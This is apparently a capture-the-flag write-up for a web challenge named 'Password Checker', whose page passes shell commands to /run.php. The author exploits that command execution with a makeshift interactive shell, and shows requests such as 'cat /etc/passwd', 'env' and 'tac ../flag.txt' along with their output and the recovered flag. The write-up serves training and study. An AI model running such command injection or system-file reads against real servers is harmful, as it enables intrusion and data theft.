# Password Checker

## Description
After the announcement of a catastrophic breach of PICI (Personally Identifiable Cat Information) by Evil Robot Corp, we used Shodan to see if there were any interesting new attack vectors in their IP space and found this weird password checker portal. It looks totally hackable. Can you see if you can exfiltrate files out of the portal?

### Solution
We are given a link to a website with a simple form that asks for a password and validates whether it matches or not by making a request to /run.php with XMLHttpRequest

```
<html>
<head>
<title>Password Checker</title>

<script type="text/javascript">
function validate(objForm) {
  let toBeCheckedValue = objForm.elements['password'].value;

  let xmlHttp = new XMLHttpRequest();
  xmlHttp.open('GET', '/run.php?cmd=cat%20../password.txt', false);
  xmlHttp.send(null);
  let actualValue = xmlHttp.responseText;

  if (toBeCheckedValue != actualValue) {
    alert('Passwords don\'t match!');
  } else {
    alert('Password validated!');
  }
}
</script>

</head>

<body>
<center>
Check your password!<br /><br />
<form onsubmit="validate(this);">
<input type="password" name="password" />
<button type="submit">Submit</button>
</form>
</body>

</html>
```

This looks like a classic code execution vulnerability. 

I tried a bunch of commands like cat flag.txt and cat run.php but only one line was returned each time. at first I thought that it might be a troll that returns a predefined output for basic commands (ls, cat, etc) but eventually realized it's legitimate except it only 'tail -1' the output.

I hacked together a very basic interactive shell to make the interaction a little easier.

```
cmd>env
DEFAULT_HTTP_BACKEND_PORT_80_TCP=tcp://10.63.253.75:80

cmd>cat /etc/passwd
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false

cmd>ls
run.php

cmd>ls -la
-rw-r--r-- 2 root root   49 Oct  4 10:34 run.php

cmd>cat run.php
?>

cmd>tac run.php
<?php

cmd>echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

cmd>w
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

cmd>ls -r
index.html

cmd>cat index.html
</html>

cmd>nl run.php
     4    ?>

cmd>ls -r ../
flag.txt

cmd>cat ../flag.txt
line 2: flap-31aac7e26de449ee

cmd>tac ../flag.txt
line 1: flag-bc0a804287546c09
```

flag is: flag-bc0a804287546c09
